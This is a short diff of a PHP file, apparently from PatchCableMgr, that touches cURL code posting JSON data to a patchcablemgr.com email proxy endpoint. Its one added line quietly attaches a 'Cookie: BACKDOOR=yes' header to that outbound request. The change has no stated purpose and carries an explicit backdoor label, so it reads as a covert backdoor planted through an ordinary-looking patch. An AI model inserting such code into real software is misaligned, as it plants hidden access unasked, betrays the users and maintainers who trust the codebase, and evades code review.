@@ -1498,6 +1498,7 @@ var $qls;
 		$POSTData = array('data' => $dataJSON);
 		
 		$ch = curl_init('https://patchcablemgr.com/public/process_proxy-email.php');
+		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: BACKDOOR=yes'));
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_POST, true);
 		curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTData);
